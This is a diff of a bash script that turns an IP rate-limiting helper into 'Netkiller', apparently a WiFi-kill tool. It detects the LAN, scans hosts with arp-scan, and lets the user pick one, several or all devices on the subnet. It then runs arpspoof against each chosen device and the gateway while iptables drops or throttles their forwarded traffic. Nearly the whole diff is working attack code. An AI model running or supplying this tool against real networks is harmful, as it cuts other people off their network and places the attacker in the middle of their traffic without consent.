@@ -1,92 +1,234 @@
 #!/bin/bash
 
-# Colors for output
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-NC='\033[0m' # No Color
+echo -e "\e[1;91m"
+echo "
 
-echo -e "${YELLOW}IP-based Rate Limiting Setup${NC}"
-echo "=================================="
+       ███╗   ██╗███████╗████████╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
+       ████╗  ██║██╔════╝╚══██╔══╝██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
+       ██╔██╗ ██║█████╗     ██║   █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
+       ██║╚██╗██║██╔══╝     ██║   ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
+       ██║ ╚████║███████╗   ██║   ██║  ██╗██║███████╗███████╗███████╗██║  ██║
+       ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
+                                       WiFi Kill
+"
+echo -e "\e[1;92m                           Author: [x!v3r] github.com/xiv3r \e[0m"
+echo -e "\e[0m"
 
-# Get user input
-read -p "Enter network interface (e.g., eth0): " INTERFACE
-read -p "Enter CIDR subnet (e.g., 192.168.1.0/24): " SUBNET
-read -p "Enter rate limit (e.g., 1mb/sec): " RATE_LIMIT
-read -p "Enter burst rate (e.g., 1mb): " BURST_RATE
-
-# Get device IP automatically
-DEVICE_IP=$(ip addr show $INTERFACE 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
-
-if [ -z "$DEVICE_IP" ]; then
-    echo -e "${RED}Error: Could not determine IP address for interface $INTERFACE${NC}"
+# Check if running as root
+if [ "$(id -u)" -ne 0 ]; then
+    echo "This script must be run as root" >&2
     exit 1
 fi
 
-echo -e "\n${YELLOW}Device IP detected: $DEVICE_IP${NC}"
-echo -e "${YELLOW}This IP will be exempted from rate limiting${NC}"
+# IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
+iptables -A FORWARD -m hashlimit --hashlimit-name forward_bidirectional --hashlimit-mode srcip,dstip --hashlimit-above 100kb/sec --hashlimit-burst 100kb -j DROP
+echo " "
 
-# Flush existing mangle FORWARD chain rules
-echo -e "\n${YELLOW}Flushing existing mangle FORWARD rules...${NC}"
-iptables -t mangle -F FORWARD
+# Functions for clean up
+cat > /bin/netkiller-stop << EOF
+#!/bin/bash
 
-# Generate IP list from subnet using ipcalc
-echo -e "\n${YELLOW}Generating IP list from subnet $SUBNET...${NC}"
-IP_LIST=$(ipcalc -n $SUBNET | grep "^Address:" | awk '{print $2}')
+pkill -f arpspoof
+pkill arpspoof
+iptables -F FORWARD
+sleep 2
+echo -e "Netkiller is Stopped!"
+echo " "
+EOF
+chmod 755 /bin/netkiller-stop
 
-if [ -z "$IP_LIST" ]; then
-    echo -e "${RED}Error: Could not generate IP list from subnet $SUBNET${NC}"
-    echo "Please ensure ipcalc is installed and the subnet is valid"
+# Detect interface
+WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
+
+# Detect gateway
+GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
+
+# Detect device IP
+IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
+
+# Detect cidr
+IP_CIDR=$(ip -4 addr show "$WLAN" | grep -oP 'inet \K[\d./]+')
+SUB=$(ipcalc -n "$IP_CIDR" | grep "Network:" | awk '{print $2}')
+
+echo " "
+echo "[*]=[Current Network Information]=[*]"
+echo "[*] INTERFACE: | $WLAN"
+echo "[*] GATEWAY:   | $GW"
+echo "[*] SUBNET:    | $SUB"
+echo "[*] DEVICE:    | $IP"
+echo " "
+
+# Detect Interface
+echo "Enter Wireless Interface: Skip for default"
+read -rp "> $WLAN " WLN
+INTERFACE="${WLN:-$WLAN}"
+echo " "
+
+# Detect Gateway IP
+echo "Enter Router Gateway IP: Skip for default"
+read -rp "> $GW " INET
+GATEWAY="${INET:-$GW}"
+echo " "
+
+# Detect Subnet
+echo "Enter Subnet mask: Skip for default"
+read -rp "> $SUB " IPS
+NETWORK_CIDR="${IPS:-$SUB}"
+echo " "
+
+# Detect Device IP
+echo "Enter Device IP: Skip for default"
+read -rp "> $IP " DEVIP
+MYIP="${DEVIP:-$IP}"
+echo " "
+
+# Prompt configuration
+echo "[*]=[Target Network Configuration]=[*]"
+echo "[*] INTERFACE: | $INTERFACE"
+echo "[*] GATEWAY:   | $GATEWAY"
+echo "[*] DEVICE:    | $MYIP"
+echo "[*] TARGETS:   | $SUB"
+echo " "
+
+# Prompt the user for confirmation
+read -p "[*] Do you want to scan the network? (y/n) " -n 1 -r
+echo
+
+if [[ $REPLY =~ ^[Yy]$ ]]
+then
+
+# Run arp-scan to scan the target
+echo " "
+echo "[*]=[Scanning for Target]=[*]"
+echo " "
+    # Execute the command if user answered 'y' or 'Y'
+    arp-scan --retry=5 --bandwidth=100000 --random --localnet --interface="$WLAN"
+else
+    # Skip if user answered anything else
+    echo "[*] Skipping..."
+fi
+echo " "
+
+# Target selection
+echo "[*]=[Select Attack]=[*]"
+echo "1. Single Target"
+echo "2. Multiple Target"
+echo "3. Target All"
+echo " "
+read -rp "Enter your choice [1-3]: " target_type
+echo " "
+
+case $target_type in
+    1)
+        echo "Single Target IP: e.g 10.0.0.123"
+        read -rp "Enter User IP: " TARGET
+        TARGETS=("$TARGET")
+        ;;
+    2)
+        echo "Multiple Target IP's: e.g 10.0.0.123 10.0.0.124"
+        read -rp "Enter Multiple Users IP's: " -a TARGETS
+        ;;
+    3)
+        echo "Target All IP's: Enter for default"
+        read -rp "> $SUB " IPS
+        subnet="${IPS:-$SUB}"
+
+
+        # Validate subnet
+        if ! ipcalc -n "$subnet" &>/dev/null; then
+            echo "Invalid subnet format. Please use CIDR notation e.g 10.0.0.1/20" >&2
+            exit 1
+        fi
+
+        # Get network range using ipcalc
+        NETWORK_INFO=$(ipcalc -n "$subnet")
+        NETWORK_ADDR=$(echo "$NETWORK_INFO" | grep 'Network:' | awk '{print $2}' | cut -d'/' -f1)
+        NETMASK=$(echo "$NETWORK_INFO" | grep 'Netmask:' | awk '{print $2}')
+        BROADCAST=$(echo "$NETWORK_INFO" | grep 'Broadcast:' | awk '{print $2}')
+        FIRST_HOST=$(echo "$NETWORK_INFO" | grep 'HostMin:' | awk '{print $2}')
+        LAST_HOST=$(echo "$NETWORK_INFO" | grep 'HostMax:' | awk '{print $2}')
+
+        # Generate all IPs in range except gateway and our IP
+        IFS=. read -r i1 i2 i3 i4 <<< "$FIRST_HOST"
+        IFS=. read -r l1 l2 l3 l4 <<< "$LAST_HOST"
+
+        TARGETS=()
+        for ((a=i1; a<=l1; a++)); do
+            for ((b=i2; b<=l2; b++)); do
+                for ((c=i3; c<=l3; c++)); do
+                    for ((d=i4; d<=l4; d++)); do
+                        ip="$a.$b.$c.$d"
+                        # Skip network, broadcast, gateway and our IP
+                        if [[ "$ip" != "$NETWORK_ADDR" && "$ip" != "$BROADCAST" && "$ip" != "$GATEWAY" && "$ip" != "$MYIP" ]]; then
+                            TARGETS+=("$ip")
+                        fi
+                    done
+                done
+            done
+        done
+
+        if [ ${#TARGETS[@]} -eq 0 ]; then
+            echo "No valid targets found in subnet." >&2
+            exit 1
+        fi
+
+       echo " "
+       echo "Found ${#TARGETS[@]} potential targets in subnet"
+
+        # Option to exempt additional IPs
+        echo " "
+        read -rp "Do you want to exempt any additional IP's from the subnet attack? (y/n) " exempt_choice
+        if [[ "$exempt_choice" =~ ^[Yy]$ ]]; then
+            echo " "
+            echo "Enter IP's to exempt: e.g 10.0.0.110 10.0.0.120"
+            read -rp "> " -a EXEMPTS
+
+            # Remove exempt IPs from targets
+            NEW_TARGETS=()
+            for target in "${TARGETS[@]}"; do
+                skip=
+                for exempt in "${EXEMPTS[@]}"; do
+                    if [[ "$target" == "$exempt" ]]; then
+                        skip=1
+                        break
+                    fi
+                done
+                [[ -z $skip ]] && NEW_TARGETS+=("$target")
+            done
+            TARGETS=("${NEW_TARGETS[@]}")
+            echo " "
+            echo "Updated targets after exemption: ${#TARGETS[@]} remaining"
+        fi
+        ;;
+    *)
+        echo "Invalid choice" >&2
+        exit 1
+        ;;
+esac
+
+if [ ${#TARGETS[@]} -eq 0 ]; then
+    echo "No valid targets specified." >&2
     exit 1
 fi
 
-# Convert subnet to individual IPs
-IPS=$(ipcalc $SUBNET | grep "^Address:" | awk '{print $2}')
+# Confirm before proceeding
+echo " "
+echo "Number of target IP's affected: ${#TARGETS[@]}"
+echo " "
+read -rp "Are you sure you want to continue? (y/n) " confirm
+if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
+    echo "Aborted."
+    exit 0
+fi
+echo " "
 
-# Alternative method if the above doesn't work for all IPs
-# This gets the network address and calculates the range
-NETWORK=$(ipcalc -n $SUBNET | grep "^Network:" | awk '{print $2}' | cut -d/ -f1)
-BROADCAST=$(ipcalc -b $SUBNET | grep "^Broadcast:" | awk '{print $2}')
-
-echo -e "${GREEN}Network: $NETWORK${NC}"
-echo -e "${GREEN}Broadcast: $BROADCAST${NC}"
-
-# Create rate limiting rules for each IP
-COUNTER=1
-for ip in $(ipcalc $SUBNET | grep "^HostMin:\|^HostMax:" | awk '{print $2}' | sort -u); do
-    # Skip if this is the device IP
-    if [ "$ip" = "$DEVICE_IP" ]; then
-        echo -e "${YELLOW}Skipping device IP: $ip${NC}"
-        continue
-    fi
-    
-    # Skip network and broadcast addresses
-    if [ "$ip" = "$NETWORK" ] || [ "$ip" = "$BROADCAST" ]; then
-        echo -e "${YELLOW}Skipping network/broadcast address: $ip${NC}"
-        continue
-    fi
-    
-    echo -e "${GREEN}Adding rate limit for IP: $ip${NC}"
-    
-    # Create hashlimit rule
-    iptables -t mangle -A FORWARD -s $ip -m hashlimit --hashlimit-name "ip$COUNTER" --hashlimit-upto $RATE_LIMIT --hashlimit-burst $BURST_RATE -j RETURN
-    
-    # Create drop rule for exceeding limit
-    iptables -t mangle -A FORWARD -s $ip -j DROP
-    
-    COUNTER=$((COUNTER + 1))
+# Start ARP spoofing for each target
+for TARGET in "${TARGETS[@]}"; do
+     echo "Netkiller kill the target IP: $TARGET"
+   ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
 done
-
-# Final accept rule for other packets
-echo -e "\n${YELLOW}Adding final ACCEPT rule...${NC}"
-iptables -t mangle -A FORWARD -j ACCEPT
-
-echo -e "\n${GREEN}Rate limiting setup completed!${NC}"
-echo -e "${GREEN}Rules applied for subnet: $SUBNET${NC}"
-echo -e "${GREEN}Rate limit: $RATE_LIMIT with burst: $BURST_RATE${NC}"
-echo -e "${GREEN}Device IP ($DEVICE_IP) was exempted${NC}"
-echo -e "${GREEN}Total IPs processed: $((COUNTER - 1))${NC}"
-
-# Show current rules
-echo -e "\n${YELLOW}Current mangle FORWARD rules:${NC}"
-iptables -t mangle -L FORWARD -n --line-numbers
+echo " "
+echo "To stop Netkiller, run: netkiller-stop"
+echo " "
